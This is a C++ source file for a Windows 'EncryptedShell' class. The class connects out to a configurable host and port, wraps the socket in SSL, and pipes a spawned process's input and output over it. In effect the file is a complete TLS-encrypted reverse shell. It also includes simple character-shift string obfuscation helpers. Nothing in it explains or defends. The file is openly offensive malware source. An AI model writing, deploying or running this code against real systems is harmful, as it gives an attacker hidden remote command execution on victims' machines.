#include "eshell.h"

using namespace std;

EncryptedShell::EncryptedShell() { return; };

EncryptedShell::EncryptedShell(std::string lhost, int lport, short family, char* process)
{
	this->EncryptedShell::lhost = lhost;
	this->EncryptedShell::lport = lport;
	this->EncryptedShell::family = family;
	this->EncryptedShell::process = process;
}

string EncryptedShell::encrypt_string(vector<char> vt,int key)
{
	string return_string_encrypted;
	int e;
	char r;
	for (int i = 0; i < vt.size(); i++)
	{
		e = (int)vt[i];
		e = e + key;
		r = e;
		return_string_encrypted += r;
	}

	return (return_string_encrypted);
}

string EncryptedShell::decrypt_string(vector<char> dec, int key)
{
	string return_string_decrypted;
	int e;
	char r;
	for (int i = 0; i < dec.size(); i++)
	{
		e = (int)dec[i];
		e = e - key;
		r = e;
		return_string_decrypted += r;
	}
	return (return_string_decrypted);
}


SOCKET EncryptedShell::init_socket()
{
	SOCKET s;
	WSADATA wsa;

	WSAStartup(MAKEWORD(2, 2), &wsa);
	s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
	return s;
}

sockaddr_in EncryptedShell::s_setting()
{
	struct sockaddr_in s;
	s.sin_family = EncryptedShell::family;
	s.sin_addr.s_addr = inet_addr(EncryptedShell::lhost.c_str());
	s.sin_port = htons(EncryptedShell::lport);
	return s;
}


void EncryptedShell::execute_encrypted_process(SOCKET s, char* process)
{
	SSL_CTX* sslctx;
	SSL* cssl;
	int results;

	SSL_load_error_strings();
	SSL_library_init();
	sslctx = SSL_CTX_new(SSLv23_method());
	cssl = SSL_new(sslctx);
	SSL_set_fd(cssl, (int)s);
	results = SSL_connect(cssl);

	if (results != -1)
	{
		char sbuffer[BUFFER_SIZE_DEFAULT];
		char rbuffer[BUFFER_SIZE_DEFAULT];
		memset(sbuffer, 0, sizeof(sbuffer));
		STARTUPINFO sinfo;
		SECURITY_ATTRIBUTES sec;
		PROCESS_INFORMATION procinfo;
		HANDLE inwrite, inread, outwrite, outread;
		DWORD bytesreads;
		DWORD exit_status;

		sec.nLength = sizeof(SECURITY_ATTRIBUTES);
		sec.bInheritHandle = TRUE;
		sec.lpSecurityDescriptor = NULL;
		CreatePipe(&inwrite, &inread, &sec, 0);
		CreatePipe(&outwrite, &outread, &sec, 0);

		memset(&sinfo, 0, sizeof(sinfo));
		sinfo.cb = sizeof(sinfo);
		sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
		sinfo.hStdInput = outwrite;
		sinfo.hStdOutput = inread;
		sinfo.hStdError = inread;
		CreateProcessA(NULL, process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &procinfo);

		while (s != SOCKET_ERROR)
		{
			GetExitCodeProcess(procinfo.hProcess, &exit_status);
			if (exit_status != STILL_ACTIVE) // Macro STILL_ACTIVE
			{
				SSL_CTX_free(sslctx);
				closesocket(s);
				WSACleanup();
				memset(&sinfo, 0, sizeof(sinfo));
				memset(sbuffer, 0, sizeof(sbuffer));
				memset(rbuffer, 0, sizeof(rbuffer));
				exit(0);
			}

			Sleep(210);
			memset(sbuffer, 0, sizeof(sbuffer));
			PeekNamedPipe(inwrite, 0, 0, 0, &bytesreads, 0);
			while (bytesreads) 
			{
				if (!ReadFile(inwrite, sbuffer, sizeof(sbuffer), &bytesreads, 0)) {
					break;
				}
				else
				{
					SSL_write(cssl, (char*)sbuffer, sizeof(sbuffer));
					memset(sbuffer, 0, sizeof(sbuffer));
					bytesreads = 0;
					Sleep(50);
					PeekNamedPipe(inwrite, 0, 0, 0, &bytesreads, 0);
				}
			}

			Sleep(210);
			memset(rbuffer, 0, sizeof(rbuffer));
			results = SSL_read(cssl, (char*)rbuffer, sizeof(rbuffer));

			if (results > 0)
			{
				if (strcmp(rbuffer, "exit\r\n") == 0)
				{
					SSL_CTX_free(sslctx);
					closesocket(s);
					WSACleanup();
					memset(&sinfo, 0, sizeof(sinfo));
					memset(sbuffer, 0, sizeof(sbuffer));
					memset(rbuffer, 0, sizeof(rbuffer));
					exit(0);
					break;
				}
				else
				{
					WriteFile(outread, rbuffer, results, &bytesreads, 0);
					memset(rbuffer, 0, sizeof(rbuffer));
					results = 0;
				}
			}
		}
	}
	SSL_CTX_free(sslctx);
	closesocket(s);
	WSACleanup();
	exit(1);
}

void EncryptedShell::reverse_s(SOCKET socks, struct sockaddr_in s)
{
	if (connect(socks, s) != -1)
	{
		EncryptedShell::execute_encrypted_process(socks,EncryptedShell::process);
	}
}

void EncryptedShell::exec()
{
	SOCKET ss = EncryptedShell::init_socket();
	sockaddr_in config = EncryptedShell::s_setting();
	EncryptedShell::reverse_s(ss, config);
	return;
}

int EncryptedShell::convert_char_to_ascii(char charactere)
{
	char chr = charactere;
	return ((int)chr);
}

char EncryptedShell::convert_ascii_to_char(char ascii_value)
{
	char chr = ascii_value;
	return (chr);
}